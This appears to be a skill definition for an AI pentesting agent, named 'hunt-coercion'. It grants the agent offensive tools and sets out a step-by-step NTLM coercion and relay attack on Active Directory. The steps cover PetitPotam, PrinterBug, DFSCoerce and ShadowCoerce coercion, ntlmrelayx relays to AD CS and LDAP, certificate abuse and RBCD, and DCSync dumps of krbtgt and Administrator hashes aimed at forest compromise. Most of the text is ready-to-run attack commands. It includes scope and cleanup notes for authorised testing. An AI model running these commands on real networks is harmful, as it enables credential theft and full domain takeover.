---
name: hunt-coercion
description: >
  NTLM coercion and relay attacks:
  PetitPotam, PrinterBug, DFSCoerce,
  ShadowCoerce. Coerce machine accounts
  to authenticate, then relay for privilege
  escalation. Refined 0 times.
allowed_tools:
  - Bash(PetitPotam*:*, printerbug*:*,
    SpoolSample*:*, dfscoerce*:*, shadowcoerce*:*,
    ntlmrelayx*:*, Responder*:*, certipy*:*,
    crackmapexec:*, netexec:*, nmap:*)
  - Read
  - Grep
  - Glob
  - WebSearch
when_to_use: >
  AD environment where NTLM relay or coercion
  is possible. Triggers: "coercion attack",
  "PetitPotam", "PrinterBug", "relay attack",
  "NTLM relay", "DFSCoerce", "force auth",
  "SpoolSample"
argument-hint: "[DC_IP ATTACKER_IP]"
---

# Hunt: NTLM Coercion & Relay

## Success Rate
- Times used: 0
- Vulns found: 0
- Last refined: N/A
- Avg severity: Critical
- Avg bounty: $10,000 - $50,000

## Goal
Coerce high-privilege machine accounts (DCs,
servers) to authenticate to attacker, then
relay credentials for domain compromise.

## Technique

### Step 1: Assess Relay Conditions
```bash
# Check SMB signing on DCs (must be off for SMB relay)
crackmapexec smb DC_IP --gen-relay-list relay.txt
# or
nmap -p 445 --script smb2-security-mode DC_IP

# Check LDAP signing
crackmapexec ldap DC_IP -u user -p pass \
  -M ldap-checker

# Check for AD CS web enrollment (HTTP = no signing)
curl -sk https://CA_IP/certsrv/
crackmapexec http CA_IP -u user -p pass \
  -M adcs
```

**Relay Matrix**:
| Source | Target | Requirement |
|--------|--------|-------------|
| Any → SMB | SMB signing OFF on target |
| Any → LDAP | LDAP signing OFF on DC |
| Any → HTTP | Always works (no signing) |
| Any → AD CS | HTTP enrollment enabled |

**Success criteria**: At least one viable
relay path identified (signing OFF or HTTP).

**Artifacts**: relay.txt (targets without
signing), AD CS endpoints.

### Step 2: Set Up Relay Infrastructure
```bash
# For AD CS relay (ESC8) — most powerful
ntlmrelayx.py \
  -t http://CA_IP/certsrv/certfnsh.asp \
  -smb2support --adcs \
  --template DomainController

# For LDAP relay (RBCD / Shadow Credentials)
ntlmrelayx.py \
  -t ldaps://DC_IP \
  --shadow-credentials \
  --shadow-target TARGET$

# For SMB relay (code execution)
ntlmrelayx.py \
  -tf relay.txt \
  -smb2support \
  -c "whoami /all"

# For LDAP relay (add computer for RBCD)
ntlmrelayx.py \
  -t ldaps://DC_IP \
  --delegate-access \
  --escalate-user attacker_user
```

**Success criteria**: Relay listener running,
ready to capture and relay.

**[human] checkpoint**: Confirm relay target
is in scope before proceeding.

### Step 3: Coerce Authentication

**PetitPotam** (MS-EFSR — most reliable):
```bash
# Unauthenticated (patched in modern DCs)
PetitPotam.py ATTACKER_IP DC_IP

# Authenticated (still works post-patch)
PetitPotam.py -u user -p password \
  -d domain.local ATTACKER_IP DC_IP
```

**PrinterBug / SpoolSample** (MS-RPRN):
```bash
# Requires Print Spooler running on target
SpoolSample.py DOMAIN/user:password@DC_IP \
  ATTACKER_IP

# Check if Spooler is running
rpcdump.py DOMAIN/user:password@DC_IP | \
  grep MS-RPRN
```

**DFSCoerce** (MS-DFSNM):
```bash
dfscoerce.py -u user -p password \
  -d domain.local ATTACKER_IP DC_IP
```

**ShadowCoerce** (MS-FSRVP):
```bash
shadowcoerce.py -u user -p password \
  -d domain.local ATTACKER_IP DC_IP
```

**Success criteria**: Target machine
authenticates to attacker listener.
NTLMv2 hash captured or relayed.

### Step 4: Exploit Relay Results

**AD CS relay → DC certificate**:
```bash
# ntlmrelayx captures DC certificate
# Use certificate to authenticate as DC
certipy auth -pfx dc01.pfx -dc-ip DC_IP

# DC authentication → DCSync
secretsdump.py -k -no-pass \
  domain.local/DC01\$@DC_IP
```

**LDAP relay → Shadow Credentials**:
```bash
# ntlmrelayx adds shadow credential
# Use resulting certificate
certipy auth -pfx shadow.pfx -dc-ip DC_IP
```

**LDAP relay → RBCD**:
```bash
# ntlmrelayx sets RBCD
# Then S4U2Self + S4U2Proxy
getST.py -spn CIFS/target.domain.local \
  -impersonate Administrator \
  DOMAIN/FAKE01\$:password -dc-ip DC_IP
```

**Success criteria**: Achieved higher
privileges via relay. DA/DCSync access.

### Step 5: Domain Dominance
```bash
# DCSync all hashes
secretsdump.py DOMAIN/admin:password@DC_IP

# Or specific high-value targets
secretsdump.py DOMAIN/admin:password@DC_IP \
  -just-dc-user krbtgt
secretsdump.py DOMAIN/admin:password@DC_IP \
  -just-dc-user Administrator
```

**Success criteria**: Full domain credential
dump or specific high-value hashes.

## Patterns That Work

| Pattern | Context | Confidence |
|---------|---------|------------|
| PetitPotam + AD CS (ESC8) | DC with CA HTTP enrollment | 10 |
| PrinterBug + unconstrained deleg | Spooler on DC + deleg machine | 9 |
| DFSCoerce + LDAP relay | DFS enabled + LDAP signing off | 8 |
| PetitPotam + shadow creds | No AD CS but LDAP relay works | 8 |
| Any coercion + SMB relay | SMB signing off on target | 7 |

## False Positive Filters
- PetitPotam unauthenticated: patched since
  KB5005413 (Aug 2021) — try authenticated
- SMB signing ON on DCs: default since 2012+ 
  → SMB relay to DC won't work, try LDAP/HTTP
- LDAP channel binding: if enforced, LDAP relay
  blocked → check with ldap-checker
- AD CS not installed: ESC8 impossible →
  try RBCD/shadow creds path instead
- EPA (Extended Protection for Auth): blocks
  HTTP relay → check CA config

## Chain Potential
```
Coercion → Relay → DC cert → DCSync → krbtgt
  → Golden Ticket → Forest compromise
```
This is often the shortest path from
domain user to Enterprise Admin.

## Safety Rails
- Authorized pentest engagement only
- Don't relay to out-of-scope targets
- Clean up RBCD delegations after test
- Clean up shadow credentials after test
- Clean up computer accounts after test
- Don't exfiltrate credentials beyond proof

## Changelog
- Initial creation: PetitPotam, PrinterBug,
  DFSCoerce, ShadowCoerce + relay techniques
